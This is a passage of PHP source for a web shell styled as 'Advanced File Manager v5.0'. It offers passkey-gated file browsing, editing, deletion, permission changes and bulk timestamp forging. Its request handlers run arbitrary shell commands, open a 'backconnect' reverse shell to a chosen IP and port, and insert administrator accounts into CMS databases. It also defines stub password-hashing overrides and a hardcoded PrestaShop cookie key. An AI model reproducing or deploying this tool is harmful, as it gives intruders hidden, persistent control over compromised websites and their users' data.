    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

function renames($item, $path, $name) {
    echo "<div class='form-container'>";
    echo "<h3><i class='fas fa-i-cursor'></i> Rename: " . htmlspecialchars($name) . "</h3>";
    echo "<form method='POST'>";
    echo "<input type='hidden' name='passkey' value='" . htmlspecialchars($_SESSION['passkey']) . "'>";
    echo "<input type='text' name='newname' class='form-input' value='" . htmlspecialchars($name) . "' required>";
    echo "<button type='submit' name='rename' class='submit-btn'><i class='fas fa-sync-alt'></i> RENAME</button>";
    echo "</form>";
    
    if (isset($_POST["rename"])) {
        $new = $_POST["newname"];
        $newPath = dirname($item) . DIRECTORY_SEPARATOR . $new;
        
        $realItem = realpath($item);
        $realNewPath = realpath(dirname($newPath)) . DIRECTORY_SEPARATOR . $new;
        $rootPath = realpath(getcwd());
        
        if ($realItem && strpos($realItem, $rootPath) === 0 && 
            strpos($realNewPath, $rootPath) === 0) {
            if (rename($item, $newPath)) {
                echo "<div class='alert success'><i class='fas fa-check-circle'></i> Renamed to: <code>" . htmlspecialchars($new) . "</code></div>";
                echo "<script>setTimeout(() => window.location = '?passkey=" . htmlspecialchars($_SESSION['passkey']) . "&path=" . urlencode($path) . "', 1000);</script>";
            } else {
                echo "<div class='alert error'><i class='fas fa-times-circle'></i> Rename failed (Permission denied)</div>";
            }
        } else {
            echo "<div class='alert error'><i class='fas fa-exclamation-triangle'></i> Invalid path or security violation</div>";
        }
    }
    echo "</div>";
}

function deleteDirectory($dir) {
    if (!file_exists($dir) || !is_dir($dir)) {
        return false;
    }
    
    $rootPath = realpath(getcwd());
    $targetPath = realpath($dir);
    
    if (!$targetPath || strpos($targetPath, $rootPath) !== 0) {
        return false;
    }
    
    $files = array_diff(scandir($dir), array('.', '..'));
    
    foreach ($files as $file) {
        $path = $dir . DIRECTORY_SEPARATOR . $file;
        
        if (is_dir($path)) {
            deleteDirectory($path);
        } else {
            @chmod($path, 0777);
            @unlink($path);
        }
    }
    
    @chmod($dir, 0777);
    return @rmdir($dir);
}

function editPermission($item, $path, $item_name) {
    $currentPerms = @fileperms($item);
    if ($currentPerms === false) {
        echo "<div class='alert error'><i class='fas fa-exclamation-triangle'></i> Cannot read file permissions</div>";
        return;
    }
    
    $octalPerms = substr(sprintf('%o', $currentPerms), -3);
    $symbolicPerms = hi_permission($item);
    
    $perms = [
        'owner' => [
            'read' => ($currentPerms & 0400) ? 1 : 0,
            'write' => ($currentPerms & 0200) ? 1 : 0,
            'execute' => ($currentPerms & 0100) ? 1 : 0
        ],
        'group' => [
            'read' => ($currentPerms & 0040) ? 1 : 0,
            'write' => ($currentPerms & 0020) ? 1 : 0,
            'execute' => ($currentPerms & 0010) ? 1 : 0
        ],
        'other' => [
            'read' => ($currentPerms & 0004) ? 1 : 0,
            'write' => ($currentPerms & 0002) ? 1 : 0,
            'execute' => ($currentPerms & 0001) ? 1 : 0
        ]
    ];
    
    echo "<div class='form-container'>";
    echo "<h3><i class='fas fa-key'></i> Change Permissions: " . htmlspecialchars($item_name) . "</h3>";
    
    echo "<div class='file-info'>";
    echo "<div class='info-card'>";
    echo "<div class='info-card-title'>Current Permissions</div>";
    echo "<div class='info-card-value'>$symbolicPerms (0$octalPerms)</div>";
    echo "</div>";
    
    $size = @filesize($item);
    echo "<div class='info-card'>";
    echo "<div class='info-card-title'>Size</div>";
    echo "<div class='info-card-value'>" . ($size !== false ? Size($item) : 'N/A') . "</div>";
    echo "</div>";
    
    $type = is_dir($item) ? 'Directory' : (is_file($item) ? 'File' : 'Unknown');
    echo "<div class='info-card'>";
    echo "<div class='info-card-title'>Type</div>";
    echo "<div class='info-card-value'>$type</div>";
    echo "</div>";
    echo "</div>";
    
    echo "<form method='POST'>";
    echo "<input type='hidden' name='passkey' value='" . htmlspecialchars($_SESSION['passkey']) . "'>";
    
    echo "<div class='permission-grid'>";
    
    echo "<div class='permission-group'>";
    echo "<div class='permission-title'><i class='fas fa-user'></i> Owner</div>";
    echo "<div class='permission-checkbox'>";
    echo "<input type='checkbox' id='read_owner' name='read_owner' " . ($perms['owner']['read'] ? 'checked' : '') . " onchange='calculatePermission()'>";
    echo "<label for='read_owner'>Read (4)</label>";
    echo "</div>";
    echo "<div class='permission-checkbox'>";
    echo "<input type='checkbox' id='write_owner' name='write_owner' " . ($perms['owner']['write'] ? 'checked' : '') . " onchange='calculatePermission()'>";
    echo "<label for='write_owner'>Write (2)</label>";
    echo "</div>";
    echo "<div class='permission-checkbox'>";
    echo "<input type='checkbox' id='execute_owner' name='execute_owner' " . ($perms['owner']['execute'] ? 'checked' : '') . " onchange='calculatePermission()'>";
    echo "<label for='execute_owner'>Execute (1)</label>";
    echo "</div>";
    echo "</div>";
    
    echo "<div class='permission-group'>";
    echo "<div class='permission-title'><i class='fas fa-users'></i> Group</div>";
    echo "<div class='permission-checkbox'>";
    echo "<input type='checkbox' id='read_group' name='read_group' " . ($perms['group']['read'] ? 'checked' : '') . " onchange='calculatePermission()'>";
    echo "<label for='read_group'>Read (4)</label>";
    echo "</div>";
    echo "<div class='permission-checkbox'>";
    echo "<input type='checkbox' id='write_group' name='write_group' " . ($perms['group']['write'] ? 'checked' : '') . " onchange='calculatePermission()'>";
    echo "<label for='write_group'>Write (2)</label>";
    echo "</div>";
    echo "<div class='permission-checkbox'>";
    echo "<input type='checkbox' id='execute_group' name='execute_group' " . ($perms['group']['execute'] ? 'checked' : '') . " onchange='calculatePermission()'>";
    echo "<label for='execute_group'>Execute (1)</label>";
    echo "</div>";
    echo "</div>";
    
    echo "<div class='permission-group'>";
    echo "<div class='permission-title'><i class='fas fa-globe'></i> Other</div>";
    echo "<div class='permission-checkbox'>";
    echo "<input type='checkbox' id='read_other' name='read_other' " . ($perms['other']['read'] ? 'checked' : '') . " onchange='calculatePermission()'>";
    echo "<label for='read_other'>Read (4)</label>";
    echo "</div>";
    echo "<div class='permission-checkbox'>";
    echo "<input type='checkbox' id='write_other' name='write_other' " . ($perms['other']['write'] ? 'checked' : '') . " onchange='calculatePermission()'>";
    echo "<label for='write_other'>Write (2)</label>";
    echo "</div>";
    echo "<div class='permission-checkbox'>";
    echo "<input type='checkbox' id='execute_other' name='execute_other' " . ($perms['other']['execute'] ? 'checked' : '') . " onchange='calculatePermission()'>";
    echo "<label for='execute_other'>Execute (1)</label>";
    echo "</div>";
    echo "</div>";
    
    echo "</div>";
    
    echo "<div style='margin: 20px 0;'>";
    echo "<label>Octal Permission:</label>";
    echo "<input type='text' id='permission_octal' name='permission_octal' class='form-input octal-input' value='$octalPerms' readonly>";
    echo "<span style='margin-left: 10px; color: var(--text-dark);'>Symbolic: <span id='permission_symbolic'>$symbolicPerms</span></span>";
    echo "</div>";
    
    echo "<button type='submit' name='change_permission' class='submit-btn'><i class='fas fa-check-circle'></i> APPLY PERMISSIONS</button>";
    echo "</form>";
    
    if (isset($_POST["change_permission"])) {
        $octal = $_POST["permission_octal"];
        $mode = octdec($octal);
        
        if (@chmod($item, $mode)) {
            echo "<div class='alert success'><i class='fas fa-check-circle'></i> Permissions changed to: 0$octal</div>";
            echo "<script>setTimeout(() => window.location = '?passkey=" . htmlspecialchars($_SESSION['passkey']) . "&path=" . urlencode($path) . "', 1000);</script>";
        } else {
            echo "<div class='alert error'><i class='fas fa-times-circle'></i> Failed to change permissions</div>";
        }
    }
    
    echo "</div>";
}

function editTimestamp($item, $path, $item_name) {
    $accessTime = @fileatime($item);
    $modifyTime = @filemtime($item);
    
    echo "<div class='timestamp-editor'>";
    echo "<h3><i class='fas fa-clock'></i> Change Timestamp: " . htmlspecialchars($item_name) . "</h3>";
    
    echo "<div class='current-timestamp'>";
    echo "<div><strong>Current Access Time:</strong> " . ($accessTime ? date('Y-m-d H:i:s', $accessTime) : 'N/A') . "</div>";
    echo "<div><strong>Current Modify Time:</strong> " . ($modifyTime ? date('Y-m-d H:i:s', $modifyTime) : 'N/A') . "</div>";
    echo "</div>";
    
    echo "<form method='POST' id='singleTimestampForm'>";
    echo "<input type='hidden' name='passkey' value='" . htmlspecialchars($_SESSION['passkey']) . "'>";
    
    echo "<div class='datetime-grid'>";
    
    echo "<div class='datetime-field'>";
    echo "<label class='datetime-label'>Date (YYYY-MM-DD)</label>";
    $currentDate = date('Y-m-d');
    echo "<input type='date' id='timestamp_date' name='timestamp_date' class='datetime-input' value='$currentDate'>";
    echo "</div>";
    
    echo "<div class='datetime-field'>";
    echo "<label class='datetime-label'>Hours (00-23)</label>";
    echo "<input type='number' id='timestamp_hours' name='timestamp_hours' class='datetime-input' min='0' max='23' value='12' step='1'>";
    echo "</div>";
    
    echo "<div class='datetime-field'>";
    echo "<label class='datetime-label'>Minutes (00-59)</label>";
    echo "<input type='number' id='timestamp_minutes' name='timestamp_minutes' class='datetime-input' min='0' max='59' value='00' step='1'>";
    echo "</div>";
    
    echo "<div class='datetime-field'>";
    echo "<label class='datetime-label'>Seconds (00-59)</label>";
    echo "<input type='number' id='timestamp_seconds' name='timestamp_seconds' class='datetime-input' min='0' max='59' value='00' step='1'>";
    echo "</div>";
    
    echo "</div>";
    
    echo "<div class='quick-buttons'>";
    echo "<button type='button' onclick='setDateTimeToNow(\"single\")' class='quick-btn'><i class='fas fa-sync-alt'></i> Set to Now</button>";
    echo "<button type='button' onclick='setDateTimeToYesterday(\"single\")' class='quick-btn'><i class='fas fa-calendar-minus'></i> Set to Yesterday</button>";
    echo "<button type='button' onclick='setDateTimeToCustom(\"single\")' class='quick-btn'><i class='fas fa-calendar-alt'></i> Set Custom</button>";
    echo "<button type='button' onclick='generateUnixTimestamp(\"single\")' class='quick-btn'><i class='fas fa-calculator'></i> Generate Unix Timestamp</button>";
    echo "</div>";
    
    echo "<div style='margin: 20px 0; padding: 15px; background: rgba(30, 30, 30, 0.6); border-radius: 4px;'>";
    echo "<label style='color: var(--text-dark); font-size: 12px;'>Unix Timestamp:</label>";
    echo "<div style='display: flex; align-items: center; gap: 10px; margin-top: 10px;'>";
    echo "<input type='text' id='timestamp_result' name='timestamp' class='form-input' style='flex: 1;' readonly>";
    echo "<span style='color: var(--text-dark); font-family: monospace;'>Value: <span id='timestamp_result_text'>0</span></span>";
    echo "</div>";
    echo "</div>";
    
    echo "<div style='margin: 20px 0;'>";
    echo "<button type='submit' name='change_timestamp' class='submit-btn'><i class='fas fa-check-circle'></i> APPLY TIMESTAMP</button>";
    echo "</div>";
    
    echo "</form>";
    
    if (isset($_POST["change_timestamp"])) {
        $date = $_POST["timestamp_date"];
        $hours = str_pad($_POST["timestamp_hours"], 2, '0', STR_PAD_LEFT);
        $minutes = str_pad($_POST["timestamp_minutes"], 2, '0', STR_PAD_LEFT);
        $seconds = str_pad($_POST["timestamp_seconds"], 2, '0', STR_PAD_LEFT);
        
        $dateTimeStr = "$date $hours:$minutes:$seconds";
        $timestamp = strtotime($dateTimeStr);
        
        if ($timestamp !== false) {
            if (@touch($item, $timestamp, $timestamp)) {
                echo "<div class='alert success'><i class='fas fa-check-circle'></i> Timestamp updated successfully</div>";
                echo "<div class='current-timestamp'>";
                echo "<div><strong>New Access Time:</strong> " . date('Y-m-d H:i:s', $timestamp) . "</div>";
                echo "<div><strong>New Modify Time:</strong> " . date('Y-m-d H:i:s', $timestamp) . "</div>";
                echo "</div>";
                echo "<script>setTimeout(() => window.location = '?passkey=" . htmlspecialchars($_SESSION['passkey']) . "&path=" . urlencode($path) . "', 1500);</script>";
            } else {
                echo "<div class='alert error'><i class='fas fa-times-circle'></i> Failed to update timestamp (Permission denied)</div>";
            }
        } else {
            echo "<div class='alert error'><i class='fas fa-exclamation-triangle'></i> Invalid date/time format</div>";
        }
    }
    
    echo "</div>";
}

function multiTimestamp($path) {
    if (isset($_POST['selected_items']) && isset($_POST['apply_multiple_timestamp'])) {
        $selectedItems = json_decode($_POST['selected_items'], true);
        $date = $_POST["timestamp_date"];
        $hours = str_pad($_POST["timestamp_hours"], 2, '0', STR_PAD_LEFT);
        $minutes = str_pad($_POST["timestamp_minutes"], 2, '0', STR_PAD_LEFT);
        $seconds = str_pad($_POST["timestamp_seconds"], 2, '0', STR_PAD_LEFT);
        
        $dateTimeStr = "$date $hours:$minutes:$seconds";
        $timestamp = strtotime($dateTimeStr);
        
        $successCount = 0;
        $failedItems = [];
        
        if ($timestamp !== false) {
            foreach ($selectedItems as $item) {
                $realItem = realpath($item);
                $rootPath = realpath(getcwd());
                
                if ($realItem && strpos($realItem, $rootPath) === 0) {
                    if (@touch($realItem, $timestamp, $timestamp)) {
                        $successCount++;
                    } else {
                        $failedItems[] = basename($item);
                    }
                } else {
                    $failedItems[] = basename($item) . " (invalid path)";
                }
            }
            
            echo "<div class='alert success'><i class='fas fa-check-circle'></i> Timestamp applied to $successCount of " . count($selectedItems) . " items</div>";
            if (!empty($failedItems)) {
                echo "<div class='alert error'><i class='fas fa-exclamation-triangle'></i> Failed to update: " . htmlspecialchars(implode(', ', $failedItems)) . "</div>";
            }
            echo "<script>setTimeout(() => window.location = '?passkey=" . htmlspecialchars($_SESSION['passkey']) . "&path=" . urlencode($path) . "', 1500);</script>";
            return;
        } else {
            echo "<div class='alert error'><i class='fas fa-exclamation-triangle'></i> Invalid date/time format</div>";
        }
    }
    
    // Display form
    $selectedItems = [];
    if (isset($_POST['selected_items'])) {
        $selectedItems = json_decode($_POST['selected_items'], true);
    } elseif (isset($_GET['selected'])) {
        $selectedItems = json_decode(urldecode($_GET['selected']), true);
    }
    
    echo "<div class='timestamp-editor'>";
    echo "<h3><i class='fas fa-calendar-alt'></i> Apply Timestamp to Multiple Items</h3>";
    
    if (empty($selectedItems)) {
        echo "<div class='alert error'><i class='fas fa-exclamation-triangle'></i> No items selected</div>";
        echo "<script>setTimeout(() => window.location = '?passkey=" . htmlspecialchars($_SESSION['passkey']) . "&path=" . urlencode($path) . "', 1000);</script>";
        echo "</div>";
        return;
    }
    
    echo "<div class='current-timestamp'>";
    echo "<div><strong>Selected Items:</strong> " . count($selectedItems) . " items</div>";
    echo "<div style='margin-top: 10px; max-height: 150px; overflow-y: auto;'>";
    foreach ($selectedItems as $item) {
        echo "<div style='color: var(--text-dark); font-size: 12px; padding: 2px 0;'>";
        echo "<i class='fas " . (is_dir($item) ? "fa-folder" : "fa-file") . "'></i> " . htmlspecialchars(basename($item));
        echo "</div>";
    }
    echo "</div>";
    echo "</div>";
    
    echo "<form method='POST' id='multiTimestampForm'>";
    echo "<input type='hidden' name='passkey' value='" . htmlspecialchars($_SESSION['passkey']) . "'>";
    echo "<input type='hidden' name='selected_items' value='" . htmlspecialchars(json_encode($selectedItems)) . "'>";
    
    echo "<div class='datetime-grid'>";
    
    echo "<div class='datetime-field'>";
    echo "<label class='datetime-label'>Date (YYYY-MM-DD)</label>";
    $currentDate = date('Y-m-d');
    echo "<input type='date' id='multi_timestamp_date' name='timestamp_date' class='datetime-input' value='$currentDate'>";
    echo "</div>";
    
    echo "<div class='datetime-field'>";
    echo "<label class='datetime-label'>Hours (00-23)</label>";
    echo "<input type='number' id='multi_timestamp_hours' name='timestamp_hours' class='datetime-input' min='0' max='23' value='12' step='1'>";
    echo "</div>";
    
    echo "<div class='datetime-field'>";
    echo "<label class='datetime-label'>Minutes (00-59)</label>";
    echo "<input type='number' id='multi_timestamp_minutes' name='timestamp_minutes' class='datetime-input' min='0' max='59' value='00' step='1'>";
    echo "</div>";
    
    echo "<div class='datetime-field'>";
    echo "<label class='datetime-label'>Seconds (00-59)</label>";
    echo "<input type='number' id='multi_timestamp_seconds' name='timestamp_seconds' class='datetime-input' min='0' max='59' value='00' step='1'>";
    echo "</div>";
    
    echo "</div>";
    
    echo "<div class='quick-buttons'>";
    echo "<button type='button' onclick='setDateTimeToNow(\"multi\")' class='quick-btn'><i class='fas fa-sync-alt'></i> Set to Now</button>";
    echo "<button type='button' onclick='setDateTimeToYesterday(\"multi\")' class='quick-btn'><i class='fas fa-calendar-minus'></i> Set to Yesterday</button>";
    echo "<button type='button' onclick='setDateTimeToCustom(\"multi\")' class='quick-btn'><i class='fas fa-calendar-alt'></i> Set Custom</button>";
    echo "<button type='button' onclick='generateUnixTimestamp(\"multi\")' class='quick-btn'><i class='fas fa-calculator'></i> Generate Unix Timestamp</button>";
    echo "</div>";
    
    echo "<div style='margin: 20px 0; padding: 15px; background: rgba(30,30,30,0.6); border-radius: 4px;'>";
    echo "<label style='color: var(--text-dark); font-size: 12px;'>Unix Timestamp:</label>";
    echo "<div style='display: flex; align-items: center; gap: 10px; margin-top: 10px;'>";
    echo "<input type='text' id='multi_timestamp_result' name='timestamp' class='form-input' style='flex: 1;' readonly>";
    echo "<span style='color: var(--text-dark); font-family: monospace;'>Value: <span id='multi_timestamp_result_text'>0</span></span>";
    echo "</div>";
    echo "</div>";
    
    echo "<div style='margin: 20px 0;'>";
    echo "<button type='submit' name='apply_multiple_timestamp' class='submit-btn'><i class='fas fa-check-circle'></i> APPLY TO ALL SELECTED ITEMS</button>";
    echo "</div>";
    
    echo "</form>";
    echo "</div>";
}

function massDelete($items, $path) {
    $successCount = 0;
    $failedItems = [];
    
    foreach ($items as $item) {
        $realItem = realpath($item);
        $rootPath = realpath(getcwd());
        
        if ($realItem && strpos($realItem, $rootPath) === 0) {
            if (is_dir($realItem)) {
                if (deleteDirectory($realItem)) {
                    $successCount++;
                } else {
                    $failedItems[] = basename($item) . " (directory)";
                }
            } else {
                if (@unlink($realItem)) {
                    $successCount++;
                } else {
                    $failedItems[] = basename($item) . " (file)";
                }
            }
        } else {
            $failedItems[] = basename($item) . " (invalid path)";
        }
    }
    
    echo "<div class='alert success'><i class='fas fa-check-circle'></i> Successfully deleted $successCount of " . count($items) . " items</div>";
    if (!empty($failedItems)) {
        echo "<div class='alert error'><i class='fas fa-exclamation-triangle'></i> Failed to delete: " . htmlspecialchars(implode(', ', $failedItems)) . "</div>";
    }
    echo "<script>setTimeout(() => window.location = '?passkey=" . htmlspecialchars($_SESSION['passkey']) . "&path=" . urlencode($path) . "', 1500);</script>";
}

function massChmod($items, $path) {
    echo "<div class='form-container'>";
    echo "<h3><i class='fas fa-key'></i> Mass Change Permissions (" . count($items) . " items)</h3>";
    
    $defaultPerms = '644';
    $ownerRead = true;
    $ownerWrite = true;
    $ownerExecute = false;
    $groupRead = true;
    $groupWrite = false;
    $groupExecute = false;
    $otherRead = true;
    $otherWrite = false;
    $otherExecute = false;
    
    echo "<form method='POST' id='massChmodForm'>";
    echo "<input type='hidden' name='passkey' value='" . htmlspecialchars($_SESSION['passkey']) . "'>";
    echo "<input type='hidden' name='selected_items' value='" . htmlspecialchars(json_encode($items)) . "'>";
    
    echo "<div class='selected-items-list'>";
    echo "<div style='max-height: 200px; overflow-y: auto; margin-bottom: 20px; padding: 10px; background: rgba(30,30,30,0.6); border-radius: 4px;'>";
    foreach ($items as $item) {
        $realItem = realpath($item);
        $isDir = is_dir($realItem);
        $perms = hi_permission($realItem);
        echo "<div style='padding: 5px; border-bottom: 1px dashed var(--medium-gray);'>";
        echo "<i class='fas " . ($isDir ? "fa-folder" : "fa-file") . "'></i> " . htmlspecialchars(basename($item)) . " <span style='color: var(--text-dark);'>($perms)</span>";
        echo "</div>";
    }
    echo "</div>";
    echo "</div>";
    
    echo "<div class='permission-grid'>";
    
    echo "<div class='permission-group'>";
    echo "<div class='permission-title'><i class='fas fa-user'></i> Owner</div>";
    echo "<div class='permission-checkbox'>";
    echo "<input type='checkbox' id='mass_read_owner' name='read_owner' value='1' " . ($ownerRead ? 'checked' : '') . " onchange='calculateMassPermission()'>";
    echo "<label for='mass_read_owner'>Read (4)</label>";
    echo "</div>";
    echo "<div class='permission-checkbox'>";
    echo "<input type='checkbox' id='mass_write_owner' name='write_owner' value='1' " . ($ownerWrite ? 'checked' : '') . " onchange='calculateMassPermission()'>";
    echo "<label for='mass_write_owner'>Write (2)</label>";
    echo "</div>";
    echo "<div class='permission-checkbox'>";
    echo "<input type='checkbox' id='mass_execute_owner' name='execute_owner' value='1' " . ($ownerExecute ? 'checked' : '') . " onchange='calculateMassPermission()'>";
    echo "<label for='mass_execute_owner'>Execute (1)</label>";
    echo "</div>";
    echo "</div>";
    
    echo "<div class='permission-group'>";
    echo "<div class='permission-title'><i class='fas fa-users'></i> Group</div>";
    echo "<div class='permission-checkbox'>";
    echo "<input type='checkbox' id='mass_read_group' name='read_group' value='1' " . ($groupRead ? 'checked' : '') . " onchange='calculateMassPermission()'>";
    echo "<label for='mass_read_group'>Read (4)</label>";
    echo "</div>";
    echo "<div class='permission-checkbox'>";
    echo "<input type='checkbox' id='mass_write_group' name='write_group' value='1' " . ($groupWrite ? 'checked' : '') . " onchange='calculateMassPermission()'>";
    echo "<label for='mass_write_group'>Write (2)</label>";
    echo "</div>";
    echo "<div class='permission-checkbox'>";
    echo "<input type='checkbox' id='mass_execute_group' name='execute_group' value='1' " . ($groupExecute ? 'checked' : '') . " onchange='calculateMassPermission()'>";
    echo "<label for='mass_execute_group'>Execute (1)</label>";
    echo "</div>";
    echo "</div>";
    
    echo "<div class='permission-group'>";
    echo "<div class='permission-title'><i class='fas fa-globe'></i> Other</div>";
    echo "<div class='permission-checkbox'>";
    echo "<input type='checkbox' id='mass_read_other' name='read_other' value='1' " . ($otherRead ? 'checked' : '') . " onchange='calculateMassPermission()'>";
    echo "<label for='mass_read_other'>Read (4)</label>";
    echo "</div>";
    echo "<div class='permission-checkbox'>";
    echo "<input type='checkbox' id='mass_write_other' name='write_other' value='1' " . ($otherWrite ? 'checked' : '') . " onchange='calculateMassPermission()'>";
    echo "<label for='mass_write_other'>Write (2)</label>";
    echo "</div>";
    echo "<div class='permission-checkbox'>";
    echo "<input type='checkbox' id='mass_execute_other' name='execute_other' value='1' " . ($otherExecute ? 'checked' : '') . " onchange='calculateMassPermission()'>";
    echo "<label for='mass_execute_other'>Execute (1)</label>";
    echo "</div>";
    echo "</div>";
    
    echo "</div>";
    
    echo "<div style='margin: 20px 0;'>";
    echo "<label>Octal Permission:</label>";
    echo "<input type='text' id='mass_permission_octal' name='permission_octal' class='form-input octal-input' value='$defaultPerms' readonly>";
    echo "<span style='margin-left: 10px; color: var(--text-dark);'>Symbolic: <span id='mass_permission_symbolic'>rw-r--r--</span></span>";
    echo "</div>";
    
    echo "<div class='quick-permission-buttons' style='margin: 20px 0;'>";
    echo "<button type='button' onclick='setMassPermission(\"755\")' class='quick-btn'>755 (rwxr-xr-x)</button>";
    echo "<button type='button' onclick='setMassPermission(\"644\")' class='quick-btn'>644 (rw-r--r--)</button>";
    echo "<button type='button' onclick='setMassPermission(\"777\")' class='quick-btn'>777 (rwxrwxrwx)</button>";
    echo "<button type='button' onclick='setMassPermission(\"600\")' class='quick-btn'>600 (rw-------)</button>";
    echo "</div>";
    
    echo "<button type='submit' name='mass_chmod_submit' class='submit-btn'><i class='fas fa-check-circle'></i> APPLY PERMISSIONS TO SELECTED ITEMS</button>";
    echo "</form>";
    
    if (isset($_POST["mass_chmod_submit"])) {
        $selectedItems = json_decode($_POST["selected_items"], true);
        $octal = $_POST["permission_octal"];
        
        if (!preg_match('/^[0-7]{3}$/', $octal)) {
            echo "<div class='alert error'><i class='fas fa-exclamation-triangle'></i> Invalid octal permission format: $octal</div>";
        } else {
            $mode = octdec($octal);
            
            $successCount = 0;
            $failedItems = [];
            
            foreach ($selectedItems as $item) {
                $realItem = realpath($item);
                $rootPath = realpath(getcwd());
                
                if ($realItem && strpos($realItem, $rootPath) === 0) {
                    if (@chmod($realItem, $mode)) {
                        $successCount++;
                    } else {
                        $failedItems[] = basename($item);
                    }
                } else {
                    $failedItems[] = basename($item) . " (invalid path)";
                }
            }
            
            echo "<div class='alert success'><i class='fas fa-check-circle'></i> Successfully changed permissions for $successCount of " . count($selectedItems) . " items to 0$octal</div>";
            if (!empty($failedItems)) {
                echo "<div class='alert error'><i class='fas fa-exclamation-triangle'></i> Failed to change permissions: " . htmlspecialchars(implode(', ', $failedItems)) . "</div>";
            }
            echo "<script>setTimeout(() => window.location = '?passkey=" . htmlspecialchars($_SESSION['passkey']) . "&path=" . urlencode($path) . "', 1500);</script>";
        }
    }
    
    echo "</div>";
}

// ============================================
// HELPER FUNCTIONS FOR PASSWORD HASHING
// ============================================

function wp_hash_password($password) {
    return password_hash($password, PASSWORD_DEFAULT);
}

function user_hash_password($password) {
    return password_hash($password, PASSWORD_DEFAULT);
}

function _password_crypt($algo, $password, $setting) {
    return password_hash($password, PASSWORD_DEFAULT);
}

function sanitize_user($username) {
    return preg_replace('/[^a-z0-9]/', '', strtolower($username));
}

if (!defined('_COOKIE_KEY_')) {
    define('_COOKIE_KEY_', 'prestashop_cookie_key_12345');
}

// ============================================
// MAIN APPLICATION LOGIC
// ============================================

// Get current working directory
$currentPath = getcwd();
if (!$currentPath) {
    $currentPath = dirname(__FILE__);
}

// Handle path navigation with security
if (isset($_GET["path"])) {
    $requestedPath = $_GET["path"];
    
    // Clean path - enhanced security
    $requestedPath = str_replace(array('../', '..\\', '//', '\\\\'), '', $requestedPath);
    
    if (is_dir($requestedPath)) {
        $currentPath = realpath($requestedPath);
    } elseif (file_exists($requestedPath)) {
        $currentPath = realpath(dirname($requestedPath));
    } else {
        // Try to resolve relative path
        $resolvedPath = realpath($currentPath . DIRECTORY_SEPARATOR . $requestedPath);
        if ($resolvedPath && is_dir($resolvedPath)) {
            $currentPath = $resolvedPath;
        }
    }
}

// Ensure we're in a valid directory
if (!$currentPath || !is_dir($currentPath)) {
    $currentPath = '/tmp';
    if (!is_dir($currentPath)) {
        $currentPath = dirname(__FILE__);
    }
}

// Try to change to the directory
@chdir($currentPath);
$path = $currentPath;

// Handle file operations
$file = isset($_GET["file"]) ? $_GET["file"] : '';
$folder = isset($_GET["folder"]) ? $_GET["folder"] : '';
$file_name = $file ? basename($file) : '';
$folder_name = $folder ? basename($folder) : '';
$item = $file ?: $folder;
$item_name = $file_name ?: $folder_name;

// Handle command execution
if (isset($_POST["exec"]) && isset($_POST["cmd"])) {
    $cmdOutput = executeCommand($_POST["cmd"]);
}

// Handle backconnect
if (isset($_POST["bc_connect"])) {
    $bcResult = backconnect($_POST["bc_ip"], (int)$_POST["bc_port"]);
}

// Handle admin creation
if (isset($_POST["add_admin_submit"])) {
    $adminResult = addAdminToCMS(
        $_POST["cms_type"],
        $_POST["admin_user"],
        $_POST["admin_pass"],
        $_POST["admin_email"],
        $_POST["db_host"],
        $_POST["db_user"],
        $_POST["db_pass"],
        $_POST["db_name"],
        $_POST["db_prefix"]
    );
}

// Handle create folder
if (isset($_POST["create_folder"])) {
    $folderResult = createFolder($_POST["folder_name"], $path);
}

// Handle file editing
if (isset($_GET["edit"]) && isset($_GET["file"])) {
    $editFile = $_GET["file"];
    $editContent = @file_get_contents($editFile);
    
    if (isset($_POST["save_edit"])) {
        if (saveme($editFile, $_POST["file_content"])) {
            echo "<div class='alert success'><i class='fas fa-check-circle'></i> File saved successfully</div>";
            $editContent = $_POST["file_content"];
        } else {
            echo "<div class='alert error'><i class='fas fa-times-circle'></i> Failed to save file</div>";
        }
    }
}

// Handle mass operations
if (isset($_POST["mass_delete_submit"])) {
    $selectedItems = json_decode($_POST["selected_items"], true);
    if (!empty($selectedItems)) {
        massDelete($selectedItems, $path);
    }
}

// Handle mass chmod
if (isset($_POST["mass_chmod_submit"])) {
    $selectedItems = json_decode($_POST["selected_items"], true);
    if (!empty($selectedItems)) {
        massChmod($selectedItems, $path);
    }
}

// Handle mass timestamp
if (isset($_POST["apply_multiple_timestamp"])) {
    multiTimestamp($path);
    exit;
}

// Handle download file
if (isset($_GET["download"]) && isset($_GET["file"])) {
    $fileToDownload = $_GET["file"];
    if (file_exists($fileToDownload) && is_file($fileToDownload)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($fileToDownload) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($fileToDownload));
        flush();
        readfile($fileToDownload);
        exit;
    }
}

// Set default action to browse
if (!isset($_GET['action'])) {
    $_GET['action'] = 'browse';
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced File Manager v5.0</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --primary-color: #8B4513;
            --secondary-color: #D2691E;
            --accent-color: #F4A460;
            --dark-color: #5D4037;
            --light-color: #FFF8DC;
            --success-color: #2E7D32;
            --warning-color: #FF8F00;
            --danger-color: #C62828;
            --info-color: #0277BD;
            --text-dark: rgba(255, 248, 220, 0.7);
            --medium-gray: rgba(244, 164, 96, 0.3);
        }
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', 'Consolas', monospace;
            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.9)), 
                        url('https://i.pinimg.com/1200x/5b/bf/b8/5bbfb8424bf918df833339748a76b073.jpg') no-repeat center center fixed;
            background-size: cover;
            background-attachment: fixed;
            color: var(--light-color);
            min-height: 100vh;
            line-height: 1.6;
        }
        .header {
            background: rgba(91, 191, 184, 0.15);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            border-bottom: 1px solid rgba(244, 164, 96, 0.3);
            padding: 15px 20px;
